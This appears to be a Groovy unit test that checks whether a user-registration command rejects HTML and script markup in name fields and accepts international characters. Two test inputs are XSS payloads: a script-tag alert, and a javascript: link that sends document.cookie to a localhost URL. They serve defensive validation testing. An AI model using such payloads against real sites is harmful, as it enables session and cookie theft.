package com.matchi

import org.junit.Test

class MarkupValidationTests extends GroovyTestCase {

    @Test
    void testCreateUserCommand() {
        CreateUserCommand cmd = new CreateUserCommand(firstname: "Sune", lastname: "Andersson", email: "sune@matchi.se", password: "Sunelösen", password2: "Sunelösen", telephone: "+46700003-4234")
        assert cmd.validate() && !cmd.hasErrors()

        cmd.firstname = "Sune<script>alert('danger');</script>";
        assert !cmd.validate() && cmd.hasErrors()

        cmd.firstname = 'Sune <a href="javascript:window.href=\"http://localhost:8080?cookie\" + document.cookie"> danger </a>'
        assert !cmd.validate() && cmd.hasErrors()

        cmd.firstname = "Sune-Åäö~~mumrik"
        assert cmd.validate() && !cmd.hasErrors()

        cmd.firstname = "Øøæ ü"
        cmd.lastname = "O'Kuf"
        assert cmd.validate() && !cmd.hasErrors()

        cmd.firstname = "Gábaaaa"
        cmd.lastname = "Frågetecken?"
        assert cmd.validate() && !cmd.hasErrors()

        cmd.firstname = "Ražallleė"
        cmd.lastname = "šić"
        assert cmd.validate() && !cmd.hasErrors()

        cmd.firstname = "质"
        cmd.lastname = "คำวิษ"
        assert cmd.validate() && !cmd.hasErrors()

        cmd.firstname = "Душ"
        cmd.lastname = "مح"
        assert cmd.validate() && !cmd.hasErrors()

        cmd.telephone = "+46 (0)31 33 33 333"
        assert cmd.validate() && !cmd.hasErrors()

        cmd.telephone = "?+46 (0)31 33 33 333?"
        assert cmd.validate() && !cmd.hasErrors()

        cmd.firstname = "C/O AB hallå eller ?! ;) :ohohoh"
        assert cmd.validate() && !cmd.hasErrors()
    }

}
